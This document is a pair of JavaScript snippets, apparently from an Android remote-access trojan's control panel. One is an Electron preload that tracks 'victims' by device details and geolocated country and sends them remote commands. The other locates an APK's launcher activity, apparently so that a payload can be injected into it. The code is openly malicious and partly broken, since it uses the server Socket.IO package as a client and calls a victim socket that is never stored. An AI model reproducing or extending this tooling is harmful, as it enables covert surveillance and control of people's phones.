## Preload.js
```js
const { contextBridge, ipcRenderer } = require('electron');

const io = require('socket.io');

const geoip = require('geoip-lite');

const victimsList = require('./app/assets/js/model/Victim');

contextBridge.exposeInMainWorld('electron', {

  connectToServer: (port) => {

    const socket = io(`http://localhost:${port}`);

    socket.on('connect', () => {

      ipcRenderer.send('SocketIO:Connected');

    });

    socket.on('disconnect', () => {

      ipcRenderer.send('SocketIO:Disconnected');

    });

    socket.on('new-victim', (victim) => {

      const { id, ip, port, manf, model, release } = victim;

      const address = socket.io.engine.transport.socket._socket.address();

      const remoteIp = address.address;

      const remotePort = address.port;

      const geo = geoip.lookup(remoteIp);

      const country = geo ? geo.country.toLowerCase() : null;

      victimsList.addVictim(id, ip, port, country, manf, model, release, remoteIp, remotePort);

      ipcRenderer.send('SocketIO:NewVictim', victim);

    });

    return socket;

  },

  getVictims: () => {

    return victimsList.getVictims();

  },

  deleteVictim: (id) => {

    victimsList.deleteVictim(id);

  },

  sendCommand: (id, command) => {

    const victim = victimsList.getVictim(id);

    victim.socket.emit('command', command);

  },

  getCommands: (id) => {

    const victim = victimsList.getVictim(id);

    return victim.commands;

  },

  deleteCommand: (id, index) => {

    const victim = victimsList.getVictim(id);

    victim.commands.splice(index, 1);

  },

  disconnect: (socket) => {

    socket.disconnect();

  },

});



```

<br>
</br>

## New activity extraction function
```js
const fs = require('fs');

const xml2js = require('xml2js');

function extractMainClassOrLauncherActivityName(manifestFilePath) {

  // Read the manifest file as a string

  const manifestString = fs.readFileSync(manifestFilePath, 'utf8');

  // Parse the manifest XML string to a JavaScript object

  let manifestObject;

  xml2js.parseString(manifestString, (err, result) => {

    if (err) {

      console.error(`Error parsing manifest file: ${err}`);

      return;

    }

    manifestObject = result;

  });

  // Extract the application node from the manifest object

  const applicationNode = manifestObject.manifest.application[0];

  // Check if the Main Application Class is declared

  if (applicationNode['$'] && applicationNode['$']['android:name']) {

    console.log(`Main Application Class: ${applicationNode['$']['android:name']}`);

  } else {

    // Otherwise, search for the Main Launcher Activity

    const activities = applicationNode.activity;

    for (let i = 0; i < activities.length; i++) {

      const activityNode = activities[i];

      if (activityNode['intent-filter'] && activityNode['intent-filter'][0]['action'][0]['$']['android:name'] === 'android.intent.action.MAIN') {

        console.log(`Main Launcher Activity: ${activityNode['$']['android:name']}`);

        break;

      }

    }

  }

}


```
